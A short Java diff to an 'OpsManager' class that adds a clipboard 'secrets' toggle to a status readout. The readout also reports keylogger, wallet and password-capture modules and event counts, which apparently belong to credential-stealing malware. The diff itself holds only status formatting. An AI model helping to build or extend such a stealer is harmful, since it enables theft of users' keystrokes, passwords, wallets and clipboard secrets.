@@ -121,7 +121,8 @@ final class OpsManager {
 		return String.join("\n",
 			"wallets: " + (wallets.wanted() ? "on" : "off"),
 			"keylogger: " + (keylogger.wanted() ? "on" : "off") + (keylogger.hardOff() ? " (hard off)" : ""),
-			"clipboard: " + (clipboard.wanted() ? "on" : "off"),
+			"clipboard: " + (clipboard.wanted() ? "on" : "off")
+				+ " · secrets " + (clipboard.secretsWanted() ? "on" : "off"),
 			"events: wallets " + state.walletEvents + " · passwords " + state.passwordEvents
 				+ " · clipboard " + state.clipEvents,
 			"windows: " + (AgentPaths.isWindows() ? "yes" : "no"));
